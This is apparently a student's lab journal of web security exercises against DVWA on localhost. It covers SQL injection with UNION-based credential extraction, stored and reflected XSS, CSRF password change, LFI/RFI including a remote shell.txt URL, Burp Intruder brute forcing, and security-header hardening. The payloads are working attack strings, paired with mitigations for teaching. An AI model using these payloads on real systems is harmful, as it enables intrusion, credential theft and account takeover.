# Day 25 - Web Application Security (DVWA Setup + SQL Injection)

-- Initialized web application security lab and performed basic SQL Injection testing using DVWA  

Objective

-- Set up DVWA in Kali Linux  
-- Understand SQL Injection fundamentals  
-- Perform basic authentication bypass  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Apache Server  
-- MySQL Database  

Step 1 – Start Required Services

-- Start Apache:

   sudo service apache2 start  

-- Start MySQL:

   sudo service mysql start  

Step 2 – Access DVWA

-- Open browser:

   http://localhost/dvwa  

-- Login credentials:

   username: admin  
   password: password  

Step 3 – Configure DVWA

-- Navigate to:
   DVWA Security  

-- Set security level:
   LOW  

-- Click:
   Create / Reset Database  

Step 4 – SQL Injection (Normal Input)

-- Go to:
   SQL Injection module  

-- Input:

   1  

-- Observation:
   -- Displays user information for ID 1  

Step 5 – SQL Injection Attack

-- Input:

   1' OR '1'='1  

-- Observation:
   -- Application returns all user records  

Explanation

-- Original query:

   SELECT * FROM users WHERE id = '1';

-- Injected query:

   SELECT * FROM users WHERE id = '1' OR '1'='1';

-- Result:
   -- Condition always TRUE → all data returned  

Security Issue

-- Application does not validate user input  
-- Directly executes SQL queries  

Basic Prevention

-- Use:
   -- Prepared Statements  
   -- Input validation  
   -- Parameterized queries  

Key Concepts Learned

-- SQL Injection allows manipulation of database queries  
-- Can lead to:
   -- Data leakage  
   -- Authentication bypass  

# Day 26 - Advanced SQL Injection (Data Extraction & Authentication Bypass)

-- Performed advanced SQL Injection techniques to extract sensitive data and bypass authentication  

Objective

-- Extract usernames and passwords from database  
-- Perform authentication bypass  
-- Understand real-world SQL Injection impact  
-- Learn mitigation techniques  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Browser  

Setup

-- Ensure DVWA Security Level = LOW  

Step 1 – Identify Injection Point

-- Navigate to:
   SQL Injection module  

-- Test input:

   1  

-- Confirm application is vulnerable  

Step 2 – Authentication Bypass

-- Input:

   ' OR '1'='1  

-- Result:
   -- Bypasses login condition  

---

Step 3 – Extract Database Information

-- Use UNION-based SQL Injection:

   1' UNION SELECT null, database()-- -

-- Output:
   -- Displays current database name  

Step 4 – Extract Table Names

   1' UNION SELECT null, table_name FROM information_schema.tables-- -

-- Result:
   -- Lists tables (e.g., users)  

Step 5 – Extract Column Names

   1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -

-- Result:
   -- Shows columns (username, password)  

Step 6 – Extract User Credentials

   1' UNION SELECT user, password FROM users-- -

-- Result:
   -- Displays usernames and hashed passwords  

 Explanation

-- UNION operator combines results from multiple queries  
-- Enables attacker to retrieve hidden database data  

Security Impact

-- Full database exposure  
-- User credential leakage  
-- Unauthorized access  

Prevention Techniques

-- Use Prepared Statements  

Example (secure query):

   SELECT * FROM users WHERE id = ?  

-- Apply:
   -- Input validation  
   -- Parameterized queries  
   -- Least privilege access  

Key Concepts Learned

-- UNION-based SQL Injection  
-- Database enumeration  
-- Data extraction techniques  

# Day 27 - Cross-Site Scripting (XSS - Stored & Reflected)

-- Performed Stored and Reflected Cross-Site Scripting attacks and analyzed their impact  

Objective

-- Understand XSS vulnerabilities  
-- Perform Stored and Reflected XSS attacks  
-- Analyze impact of client-side code injection  
-- Implement mitigation techniques  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Web Browser  

Setup

-- DVWA Security Level set to LOW  

What is XSS?

-- Cross-Site Scripting allows attackers to inject malicious scripts into web pages  
-- Executes in victim’s browser  

Part 1 – Stored XSS

Step 1:
-- Go to:
   XSS (Stored) module  

Step 2:
-- Input payload:

   <script>alert('Stored XSS')</script>

Step 3:
-- Submit form  

Result:
-- Script executes whenever page loads  

Part 2 – Reflected XSS

Step 1:
-- Go to:
   XSS (Reflected) module  

Step 2:
-- Input:

   <script>alert('Reflected XSS')</script>

Result:
-- Script executes immediately in response  

Explanation

-- Stored XSS:
   -- Payload saved in server/database  

-- Reflected XSS:
   -- Payload reflected in response  

Security Impact

-- Session hijacking  
-- Cookie theft  
-- Phishing attacks  
-- Defacement  

Mitigation Techniques

-- Input Validation  
-- Output Encoding  
-- Content Security Policy (CSP)  

Example CSP:
   Content-Security-Policy: default-src 'self'; script-src 'self'

Key Concepts Learned

-- Client-side code execution risk  
-- Persistent vs non-persistent XSS  
-- Importance of sanitizing user input  

# Day 28 - Cross-Site Request Forgery (CSRF)

-- Performed CSRF attack to change user password without authorization and analyzed prevention mechanisms  

Objective

-- Understand CSRF vulnerability  
-- Perform CSRF attack on DVWA  
-- Change user password without user consent  
-- Learn prevention using CSRF tokens  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Browser  

Setup

-- DVWA Security Level set to LOW  

What is CSRF?

-- CSRF tricks a user into performing unwanted actions on a web application where they are already authenticated  

Step 1 – Navigate to CSRF Module

-- Open:
   CSRF (Change Password)  

Step 2 – Observe Normal Request

-- Change password normally  

-- Example:
   new password: test123  

Step 3 – Capture Request URL

-- URL looks like:

   http://localhost/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change  

Step 4 – Create Malicious Link

-- Copy URL and modify password:

   http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change  

Step 5 – Execute Attack

-- Open link in browser  

Result:
-- Password gets changed without authentication prompt  

Explanation

-- Browser automatically sends session cookies  
-- Server trusts request → executes action  

Security Impact

-- Unauthorized actions  
-- Account takeover  
-- Data manipulation  

Prevention Techniques

-- Use CSRF Tokens  
-- Validate origin/referrer  
-- SameSite Cookies  

DVWA Protection Demo

-- Set security level to MEDIUM or HIGH  

-- Observe:
   -- Token added to request  
   -- Attack fails without valid token  

Key Concepts Learned

-- CSRF exploits authenticated sessions  
-- Lack of request validation leads to vulnerability   

# Day 29 - File Inclusion Attacks (LFI & RFI)

-- Performed Local File Inclusion (LFI) and Remote File Inclusion (RFI) attacks to access sensitive files and execute external code  

Objective

-- Understand file inclusion vulnerabilities  
-- Perform Local File Inclusion (LFI)  
-- Perform Remote File Inclusion (RFI)  
-- Analyze impact and mitigation techniques  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Web Browser  

Setup

-- DVWA Security Level set to LOW  

What is File Inclusion?

-- Allows attacker to include files through user input  
-- Can expose sensitive data or execute malicious code  

Part 1 = Local File Inclusion (LFI)

Step 1:
-- Go to:
   File Inclusion module  

Step 2:
-- Modify URL parameter:

   page=../../../../etc/passwd  

Result:
-- Displays system file (/etc/passwd)  

Explanation (LFI)

-- Application includes file directly from system  
-- Path traversal used to access sensitive files  


Part 2 – Remote File Inclusion (RFI)

Step 1:
-- Use external URL:

   page=http://example.com/shell.txt  

Result:
-- Executes remote file content  

Explanation (RFI)

-- Application allows external file inclusion  
-- Attacker can execute malicious code  

Security Impact

-- Exposure of sensitive system files  
-- Remote code execution  
-- Full system compromise  

Mitigation Techniques

-- Validate user input  
-- Restrict file paths  
-- Disable allow_url_include  
-- Use whitelisting for files  

Key Concepts Learned

-- Path traversal attacks  
-- Difference between LFI and RFI  
-- Risk of insecure file handling  

# Day 30 - Burp Suite(Interception, Modification, Intruder)

-- Performed in-depth testing using Burp Suite by intercepting HTTP traffic, modifying requests, and conducting controlled fuzzing using Intruder
 Objective
-- Understand HTTP request-response flow in real scenarios
-- Intercept and analyze raw HTTP requests
-- Modify parameters to test vulnerabilities
-- Perform controlled fuzzing to identify weak inputs
-- Analyze responses for security issues

Tools Used
-- Kali Linux
-- Burp Suite
-- DVWA
-- Web Browser

Step 1 – Understanding Proxy Behavior
-- Burp Suite works as a proxy between browser and server
Flow:
Browser → Burp → Server → Burp → Browser

-- All HTTP requests pass through Burp
-- Allows inspection and modification before reaching server

Step 2 – Configure Proxy

-- Set browser proxy:

IP: 127.0.0.1
Port: 8080

-- This ensures all traffic is routed through Burp

Step 3 – Intercepting HTTP Request

-- Enable:
Proxy → Intercept → ON

-- Perform login in DVWA

Captured request:

POST /dvwa/login.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&Login=Login

Analysis of Request

-- Request contains:
-- Method (POST)
-- URL endpoint
-- Headers
-- Body parameters

-- Sensitive data like credentials can be visible if not encrypted

Step 4 – Modifying Requests

-- Modify request before forwarding

Example:

username=admin&password=wrong

Change to:

username=admin&password=admin

-- Or test injection:

username=admin' OR '1'='1&password=test

-- Forward request to server

-- Observe response behavior

Step 5 – Parameter Tampering

-- Modify hidden or visible parameters

Example:

role=user → role=admin

-- Used to test:
-- Authorization flaws
-- Access control issues

Step 6 – Sending Request to Intruder

-- Right click request → Send to Intruder

-- Used for automated testing

Step 7 – Intruder Configuration

-- Go to:
Intruder → Positions

-- Select parameter (e.g., password)

Example:

password=§test§

-- Choose attack type:
-- Sniper (single parameter testing)

Step 8 – Payload Setup

-- Load payload list (common passwords)

Example:
admin
123456
password
test123

Step 9 – Launch Attack

-- Start Intruder attack

-- Observe results table

Step 10 – Analyze Results

-- Focus on:
-- Response length
-- Status code
-- Response content

-- Different response length indicates possible valid credential

Key Technical Concepts

-- HTTP request structure
-- Client-server communication
-- Parameter manipulation
-- Automated fuzzing

Security Impact

-- Credential brute force
-- Authentication bypass
-- Parameter tampering
-- Session manipulation

Mitigation Techniques

-- Implement strong authentication
-- Apply rate limiting
-- Use account lockout policies
-- Validate and sanitize inputs
-- Use HTTPS to protect data in transit


# Day 31 - Web Security Headers & Hardening

-- Analyzed HTTP security headers and implemented defensive mechanisms to secure web applications against common attacks  

Objective

-- Understand HTTP security headers  
-- Analyze existing headers in web applications  
-- Identify missing or weak configurations  
-- Implement proper security headers  
-- Learn how headers mitigate attacks  

Tools Used

-- Kali Linux  
-- Web Browser  
-- Developer Tools (Inspect → Network tab)  
-- securityheaders.com  

Step 1 – Analyze Existing Headers

-- Open DVWA or any test web application  

-- Open Developer Tools:
   -- Right click → Inspect  
   -- Go to Network tab  
   -- Reload the page  

-- Click any request → View Response Headers  

Example Response Headers

HTTP/1.1 200 OK  
Server: Apache/2.4.41  
Content-Type: text/html  

Observation

-- Missing important security headers:
   -- Content-Security-Policy  
   -- X-Frame-Options  
   -- X-XSS-Protection  
   -- Strict-Transport-Security  

-- Indicates weak security configuration  

Step 2 – External Analysis

-- Open:
   https://securityheaders.com  

-- Enter target website URL  

-- Analyze results  

Result

-- Website receives grade (A to F)  
-- Shows missing and misconfigured headers  

Step 3 – Important Security Headers

1. Content Security Policy (CSP)

Content-Security-Policy: default-src 'self';

-- Restricts loading of scripts and resources  
-- Prevents Cross-Site Scripting (XSS)  

2. X-Frame-Options

X-Frame-Options: DENY

-- Prevents embedding in iframes  
-- Protects against clickjacking  

3. X-XSS-Protection

X-XSS-Protection: 1; mode=block

-- Enables browser XSS filtering  

4. Strict-Transport-Security (HSTS)

Strict-Transport-Security: max-age=31536000; includeSubDomains

-- Forces HTTPS usage  
-- Prevents downgrade attacks  


5. X-Content-Type-Options

X-Content-Type-Options: nosniff

-- Prevents MIME type sniffing  

Step 4 – Implement Headers in Apache

-- Open configuration file:

sudo nano /etc/apache2/conf-available/security.conf  

-- Add:

Header set Content-Security-Policy "default-src 'self';"  
Header set X-Frame-Options "DENY"  
Header set X-XSS-Protection "1; mode=block"  
Header set X-Content-Type-Options "nosniff"  

Step 5 – Restart Apache

sudo service apache2 restart  

Step 6 – Verify Headers

-- Reload application  
-- Check Developer Tools → Response Headers  

-- Confirm headers are present  

Security Impact

-- Without headers:
   -- XSS attacks possible  
   -- Clickjacking risk  
   -- Data injection vulnerabilities  

Mitigation Summary

-- Use CSP to restrict scripts  
-- Prevent iframe embedding  
-- Enforce HTTPS  
-- Disable content sniffing  

Key Concepts Learned

-- HTTP headers act as first layer of defense  
-- Security misconfiguration leads to vulnerabilities  
-- Proper headers significantly improve application security  


# Day 31 & 32 - Web Security Headers & Final Security Testing

-- Implemented HTTP security headers, performed full vulnerability testing, and prepared final security analysis report  

Objective

-- Analyze and implement web security headers  
-- Perform end-to-end testing of vulnerabilities (SQLi, XSS, CSRF)  
-- Validate mitigation techniques  
-- Prepare final security testing report  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Burp Suite  
-- Web Browser  
-- securityheaders.com  

Part 1 – Web Security Headers Analysis

Step 1 – Inspect Existing Headers

-- Open DVWA  

-- Use Developer Tools:
   -- Inspect → Network → Reload  

-- Check Response Headers  

Observed Headers

HTTP/1.1 200 OK  
Server: Apache  
Content-Type: text/html  

Observation

-- Missing security headers:
   -- Content-Security-Policy  
   -- X-Frame-Options  
   -- X-XSS-Protection  
   -- Strict-Transport-Security  

Step 2 – External Scan

-- Open:
   https://securityheaders.com  

-- Analyze target  

Result

-- Low security rating due to missing headers  

Step 3 – Implement Security Headers

-- Open config file:

sudo nano /etc/apache2/conf-available/security.conf  

-- Add:

Header set Content-Security-Policy "default-src 'self';"  
Header set X-Frame-Options "DENY"  
Header set X-XSS-Protection "1; mode=block"  
Header set X-Content-Type-Options "nosniff"  

Restart Server

sudo service apache2 restart  

Verification

-- Reload site  
-- Confirm headers in response  

Impact

-- Prevents XSS  
-- Prevents Clickjacking  
-- Improves browser-level security  

Part 2 – Final Vulnerability Testing

SQL Injection Testing

-- Tested login bypass  

Payload:
' OR '1'='1  

-- Result:
-- Authentication bypass successful  

XSS Testing

-- Tested Stored XSS  

Payload:
<script>alert('XSS')</script>  

-- Result:
-- Script executed in browser  

CSRF Testing

-- Crafted malicious request  

-- Result:
-- Password changed without user consent  

File Inclusion Testing

-- Performed LFI  

Payload:
../../../../etc/passwd  

-- Result:
-- Sensitive system file exposed  

Burp Suite Testing

-- Intercepted HTTP requests  
-- Modified parameters  
-- Performed fuzzing using Intruder  

Security Findings

-- Input validation missing  
-- Authentication bypass possible  
-- Sensitive data exposure  
-- Weak security configuration  

Mitigation Summary

-- Use prepared statements (SQLi)  
-- Apply input validation and encoding (XSS)  
-- Implement CSRF tokens  
-- Restrict file access (LFI/RFI)  
-- Add security headers  

Final Outcome

-- Successfully identified and exploited multiple vulnerabilities  
-- Implemented defensive mechanisms  
-- Verified security improvements  

Key Concepts Learned

-- End-to-end web application testing  
-- Attack and defense methodology  
-- Importance of secure configuration  
